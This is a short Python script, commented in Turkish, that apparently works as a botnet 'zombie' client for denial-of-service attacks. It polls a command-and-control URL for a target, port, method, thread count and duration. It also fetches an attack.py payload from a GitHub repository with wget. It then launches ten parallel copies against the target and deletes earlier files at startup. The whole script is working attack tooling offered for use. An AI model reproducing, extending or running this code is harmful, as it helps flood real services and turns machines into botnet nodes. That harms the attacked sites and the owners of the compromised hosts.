#!/usr/bin/env python3
import os
import time
import requests
import subprocess

# --- AYARLAR ---
MASTER_URL = "https://ordu-komutan-3.loca.lt" 
ZOMBI_AD = f"Zombi-{os.uname()[1]}"

def temizlik_yap():
    print("🧹 Eski mühimmatlar temizleniyor...")
    os.system("rm -f attack.py* slave.py* attack.log")
    
    print("📦 En güncel dosyalar mühimmat deposundan (GitHub) çekiliyor...")
    os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/attack.py")
    os.system("chmod +x attack.py")

def komut_dinle():
    print(f"🚀 {ZOMBI_AD} tertemiz bir şekilde göreve hazır!")
    print(f"📡 Beyin Bağlantısı: {MASTER_URL}")
    
    while True:
        try:
            headers = {'bypass-tunnel-reminder': 'true', 'User-Agent': 'Zombi-V3-Clean'}
            response = requests.get(f"{MASTER_URL}/get_command", headers=headers, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                method = data.get("method")
                target = data.get("target")
                port = data.get("port")
                t = data.get("threads")
                s = data.get("duration")

                if method and target:
                    thread_sayisi = t if t else 200
                    print(f"\n[!] EMİR GELDİ: {method.upper()} -> {target}:{port} | Thread: {thread_sayisi}")

                    if not os.path.exists("attack.py"):
                        os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/attack.py")

                    attack_cmd = [
                        "python3", "attack.py", 
                        str(method), str(target), str(port), 
                        str(thread_sayisi), str(s)
                    ]
                    
                    # --- TURBO MODU: BURASI HATTI ŞİŞİRECEK ---
                    with open("attack.log", "a") as log_file:
                        # Tek bir işlem yerine 10 farklı koldan saldırıyı başlatıyoruz
                        # Bu sayede GitHub'ın o devasa hattını sonuna kadar zorlayacağız.
                        for i in range(10):
                            subprocess.Popen(attack_cmd, stdout=log_file, stderr=log_file)
                    
                    print(f"✅ ✅ 10 KAT GÜÇLE: Mermiler taze dosyadan ateşlendi!")

            # Komut kontrol süresini biraz kısalttım (5 saniyeden 3'e) daha seri olsun
            time.sleep(3)
            
        except Exception as e:
            print(f"⚠️ Bağlantı bekleniyor... ({e})")
            time.sleep(10)

if __name__ == "__main__":
    temizlik_yap() # Önce ortalığı süpürür
    komut_dinle()  # Sonra dinlemeye başlar
